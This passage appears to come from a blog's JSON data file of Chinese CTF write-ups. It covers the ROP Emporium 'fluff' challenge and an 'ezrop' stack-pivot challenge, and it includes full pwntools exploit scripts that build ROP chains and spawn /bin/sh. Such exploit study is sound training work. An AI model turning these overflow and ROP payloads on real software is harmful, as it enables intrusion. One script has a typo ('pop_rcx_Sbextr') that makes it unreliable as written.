pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(t_char-0x3ef2-0x78)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rdi) + pd(data_start) + pd(print_file)\n\n\np.recvuntil('> ')\np.sendline(payload)\np.interactive()\n```\n\n\n\n还是不能对长ROP链有畏惧心理","source":"_posts/Unusual-instruments-flluf-[ROPEmporium-4].md","raw":"---\ntitle: Unusual-instruments-flluf-[ROPEmporium-4]\ndate: 2022-3-2\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n## ROP Emporium-fluff\n\n这个的exp是我写的最没底的一次，可用的gadget少的可怜\n\n根据提示，要去在questionableGadgets里去找\n\n```assembly\n.text:0000000000400628 questionableGadgets:\n.text:0000000000400628                 xlat\n.text:0000000000400629                 retn\n.text:000000000040062A ; -------------------------------------------\n.text:000000000040062A                 pop     rdx\n.text:000000000040062B                 pop     rcx\n.text:000000000040062C                 add     rcx, 3EF2h\n.text:0000000000400633                 bextr   rbx, rcx, rdx\n.text:0000000000400638                 retn\n.text:0000000000400639 ; -------------------------------------------\n.text:0000000000400639                 stosb\n.text:000000000040063A                 retn\n```\n\n查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入\n\n```markdown\nbextr\t\t//从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数\nxlat\t\t//[bx + al] to al\nstosb\t\t//al to [rdi]，然后递增rdi\n```\n\n但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。\n\n然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了\n\n于是还是决定尝试一字一字写入\n\n```c\nfrom pwn import*\n\np = process('./fluff')\ncontext.log_level = 'debug'\n\npd = lambda x:p64(x).decode('unicode_escape')\n\nstosb_rdi_al = 0x400639\nxlat = 0x400628 \nbextr = 0x40062a\ndata_start = 0x601028\npop_rdi = 0x4006a3\npop_rcx_bextr = 0x40062b\nprint_file = 0x400510\nf_char = 0x4003c4\nl_char = 0x4003c5\na_char = 0x400411\ng_char = 0x4003cf\ndot_char = 0x400400\nt_char = 0x4003e0\nx_char = 0x400751\n\n\npayload = 'A'*(0x28) + pd(bextr)\npayload+= pd(0x4000) + pd(f_char-0x3ef2-0xb)\npayload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(l_char-0x3ef2-0x66)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_Sbextr)\npayload+= pd(a_char-0x3ef2-0x6c)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(g_char-0x3ef2-0x61)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(dot_char-0x3ef2-0x67)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(t_char-0x3ef2-0x2e)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(x_char-0x3ef2-0x74)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(t_char-0x3ef2-0x78)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rdi) + pd(data_start) + pd(print_file)\n\n\np.recvuntil('> ')\np.sendline(payload)\np.interactive()\n```\n\n\n\n还是不能对长ROP链有畏惧心理","slug":"Unusual-instruments-flluf-[ROPEmporium-4]","published":1,"updated":"2022-07-12T12:05:19.216Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majd000ej8v0gav9b7cl","content":"<h2 id=\"ROP-Emporium-fluff\">ROP Emporium-fluff</h2>\n<p>这个的exp是我写的最没底的一次，可用的gadget少的可怜</p>\n<p>根据提示，要去在questionableGadgets里去找</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400628 questionableGadgets:</span><br><span class=\"line\">.text:0000000000400628                 xlat</span><br><span class=\"line\">.text:0000000000400629                 retn</span><br><span class=\"line\">.text:000000000040062A ; -------------------------------------------</span><br><span class=\"line\">.text:000000000040062A                 pop     rdx</span><br><span class=\"line\">.text:000000000040062B                 pop     rcx</span><br><span class=\"line\">.text:000000000040062C                 add     rcx, 3EF2h</span><br><span class=\"line\">.text:0000000000400633                 bextr   rbx, rcx, rdx</span><br><span class=\"line\">.text:0000000000400638                 retn</span><br><span class=\"line\">.text:0000000000400639 ; -------------------------------------------</span><br><span class=\"line\">.text:0000000000400639                 stosb</span><br><span class=\"line\">.text:000000000040063A                 retn</span><br></pre></td></tr></table></figure>\n<p>查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bextr\t\t//从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数</span><br><span class=\"line\">xlat\t\t//[bx + al] to al</span><br><span class=\"line\">stosb\t\t//al to [rdi]，然后递增rdi</span><br></pre></td></tr></table></figure>\n<p>但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。</p>\n<p>然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了</p>\n<p>于是还是决定尝试一字一字写入</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./fluff&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = lambda x:p64(x).decode(<span class=\"string\">&#x27;unicode_escape&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stosb_rdi_al = <span class=\"number\">0x400639</span></span><br><span class=\"line\">xlat = <span class=\"number\">0x400628</span> </span><br><span class=\"line\">bextr = <span class=\"number\">0x40062a</span></span><br><span class=\"line\">data_start = <span class=\"number\">0x601028</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x4006a3</span></span><br><span class=\"line\">pop_rcx_bextr = <span class=\"number\">0x40062b</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x400510</span></span><br><span class=\"line\">f_char = <span class=\"number\">0x4003c4</span></span><br><span class=\"line\">l_char = <span class=\"number\">0x4003c5</span></span><br><span class=\"line\">a_char = <span class=\"number\">0x400411</span></span><br><span class=\"line\">g_char = <span class=\"number\">0x4003cf</span></span><br><span class=\"line\">dot_char = <span class=\"number\">0x400400</span></span><br><span class=\"line\">t_char = <span class=\"number\">0x4003e0</span></span><br><span class=\"line\">x_char = <span class=\"number\">0x400751</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span>*(<span class=\"number\">0x28</span>) + pd(bextr)</span><br><span class=\"line\">payload+= pd(<span class=\"number\">0x4000</span>) + pd(f_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0xb</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(l_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x66</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_Sbextr)</span><br><span class=\"line\">payload+= pd(a_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x6c</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(g_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x61</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(dot_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x67</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(t_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x2e</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(x_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x74</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(t_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x78</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rdi) + pd(data_start) + pd(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>还是不能对长ROP链有畏惧心理</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ROP-Emporium-fluff\">ROP Emporium-fluff</h2>\n<p>这个的exp是我写的最没底的一次，可用的gadget少的可怜</p>\n<p>根据提示，要去在questionableGadgets里去找</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400628 questionableGadgets:</span><br><span class=\"line\">.text:0000000000400628                 xlat</span><br><span class=\"line\">.text:0000000000400629                 retn</span><br><span class=\"line\">.text:000000000040062A ; -------------------------------------------</span><br><span class=\"line\">.text:000000000040062A                 pop     rdx</span><br><span class=\"line\">.text:000000000040062B                 pop     rcx</span><br><span class=\"line\">.text:000000000040062C                 add     rcx, 3EF2h</span><br><span class=\"line\">.text:0000000000400633                 bextr   rbx, rcx, rdx</span><br><span class=\"line\">.text:0000000000400638                 retn</span><br><span class=\"line\">.text:0000000000400639 ; -------------------------------------------</span><br><span class=\"line\">.text:0000000000400639                 stosb</span><br><span class=\"line\">.text:000000000040063A                 retn</span><br></pre></td></tr></table></figure>\n<p>查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bextr\t\t//从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数</span><br><span class=\"line\">xlat\t\t//[bx + al] to al</span><br><span class=\"line\">stosb\t\t//al to [rdi]，然后递增rdi</span><br></pre></td></tr></table></figure>\n<p>但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。</p>\n<p>然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了</p>\n<p>于是还是决定尝试一字一字写入</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./fluff&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pd = lambda x:p64(x).decode(<span class=\"string\">&#x27;unicode_escape&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stosb_rdi_al = <span class=\"number\">0x400639</span></span><br><span class=\"line\">xlat = <span class=\"number\">0x400628</span> </span><br><span class=\"line\">bextr = <span class=\"number\">0x40062a</span></span><br><span class=\"line\">data_start = <span class=\"number\">0x601028</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x4006a3</span></span><br><span class=\"line\">pop_rcx_bextr = <span class=\"number\">0x40062b</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x400510</span></span><br><span class=\"line\">f_char = <span class=\"number\">0x4003c4</span></span><br><span class=\"line\">l_char = <span class=\"number\">0x4003c5</span></span><br><span class=\"line\">a_char = <span class=\"number\">0x400411</span></span><br><span class=\"line\">g_char = <span class=\"number\">0x4003cf</span></span><br><span class=\"line\">dot_char = <span class=\"number\">0x400400</span></span><br><span class=\"line\">t_char = <span class=\"number\">0x4003e0</span></span><br><span class=\"line\">x_char = <span class=\"number\">0x400751</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span>*(<span class=\"number\">0x28</span>) + pd(bextr)</span><br><span class=\"line\">payload+= pd(<span class=\"number\">0x4000</span>) + pd(f_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0xb</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(l_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x66</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_Sbextr)</span><br><span class=\"line\">payload+= pd(a_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x6c</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(g_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x61</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(dot_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x67</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(t_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x2e</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(x_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x74</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rcx_bextr)</span><br><span class=\"line\">payload+= pd(t_char<span class=\"number\">-0x3ef2</span><span class=\"number\">-0x78</span>)</span><br><span class=\"line\">payload+= pd(xlat) + pd(stosb_rdi_al)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+= pd(pop_rdi) + pd(data_start) + pd(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>还是不能对长ROP链有畏惧心理</p>\n"},{"title":"dlresolve-Feature-and-Segmented-stack-migration-ezrop","date":"2022-04-24T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n# dlresolve Feature and Segmented stack migration-ezrop\n\n## 0x1 checksek\n\n```bash\n$ checksec ezrop \n[*] '/home/nemo/Active/Script/ezrop'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n```\n\n开了NX和partial RELRO\n\n## 0x2 Analysis\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[48]; // [rsp+0h] [rbp-30h] BYREF\n\n  init(argc, argv, envp);\n  puts(\"You can use stackoverflow.\");\n  puts(\"But only overflow a bit more...\");\n  puts(\"And you must print first.\");\n  memset(s, 0, 0x20uLL);\n  write(1, s, 0x30uLL);\n  read(0, s, 0x40uLL);\n  return 0;\n}\n```\n\n这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串\n\n但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行\n\n~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~\n\n## 0x3 Process\n\n1. 栈迁移到data段\n2. 通过rbp控制read写入位置在数据段写入ROP链\n3. getshell\n\n## 0x4 Some questions\n\n1. 对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。\n2. 在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800\n\n## 0x5 exp\n\n```c\nfrom pwn import*\n\np = process('./ezrop')\n#p = gdb.debug('./ezrop')\n\nm = u64(p.recv(40)[-8:])\n\npayloads = p64(0x400863) + b'/bin/sh\\0' + p64(0x400600)\n\npayloads += cyclic(0x18)\npayloads += p64(0x601848+0x30) + p64(0x4007d9)\n\np.send(payloads)\n\nsleep(1)\n\npayloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) \npayloads += b'/bin/sh\\0'\npayloads += b'/bin/sh\\0'\npayloads += p64(0x601848-0x8) + p64(0x4007f9)\n\np.send(payloads)\n\np.interactive()\n\n#0x00007f7b3ce92bb0      0x00007f7b3ccf8450\n```\n\n## 0x6 New skills\n\n1. 分段打栈迁移\n   - 在第一次read读入后将rbp改为要写入的位置\n   - ret到read\n   - 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n   - 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n2. dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间","source":"_posts/dlresolve-Feature-and-Segmented-stack-migration-ezrop.md","raw":"---\ntitle: dlresolve-Feature-and-Segmented-stack-migration-ezrop\ndate: 2022-4-25\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# dlresolve Feature and Segmented stack migration-ezrop\n\n## 0x1 checksek\n\n```bash\n$ checksec ezrop \n[*] '/home/nemo/Active/Script/ezrop'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n```\n\n开了NX和partial RELRO\n\n## 0x2 Analysis\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[48]; // [rsp+0h] [rbp-30h] BYREF\n\n  init(argc, argv, envp);\n  puts(\"You can use stackoverflow.\");\n  puts(\"But only overflow a bit more...\");\n  puts(\"And you must print first.\");\n  memset(s, 0, 0x20uLL);\n  write(1, s, 0x30uLL);\n  read(0, s, 0x40uLL);\n  return 0;\n}\n```\n\n这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串\n\n但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行\n\n~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~\n\n## 0x3 Process\n\n1. 栈迁移到data段\n2. 通过rbp控制read写入位置在数据段写入ROP链\n3. getshell\n\n## 0x4 Some questions\n\n1. 对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。\n2. 在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800\n\n## 0x5 exp\n\n```c\nfrom pwn import*\n\np = process('./ezrop')\n#p = gdb.debug('./ezrop')\n\nm = u64(p.recv(40)[-8:])\n\npayloads = p64(0x400863) + b'/bin/sh\\0' + p64(0x400600)\n\npayloads += cyclic(0x18)\npayloads += p64(0x601848+0x30) + p64(0x4007d9)\n\np.send(payloads)\n\nsleep(1)\n\npayloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) \npayloads += b'/bin/sh\\0'\npayloads += b'/bin/sh\\0'\npayloads += p64(0x601848-0x8) + p64(0x4007f9)\n\np.send(payloads)\n\np.interactive()\n\n#0x00007f7b3ce92bb0      0x00007f7b3ccf8450\n```\n\n## 0x6 New skills\n\n1. 分段打栈迁移\n   - 在第一次read读入后将rbp改为要写入的位置\n   - ret到read\n   - 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8\n   - 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置\n2. dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间","slug":"dlresolve-Feature-and-Segmented-stack-migration-ezrop","published":1,"updated":"2022-07-12T12:04:09.193Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6maje000fj8v0fqrpert5","content":"<h1 id=\"dlresolve-Feature-and-Segmented-stack-migration-ezrop\">dlresolve Feature and Segmented stack migration-ezrop</h1>\n<h2 id=\"0x1-checksek\">0x1 checksek</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec ezrop </span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/nemo/Active/Script/ezrop&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>开了NX和partial RELRO</p>\n<h2 id=\"0x2-Analysis-3\">0x2 Analysis</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;But only overflow a bit 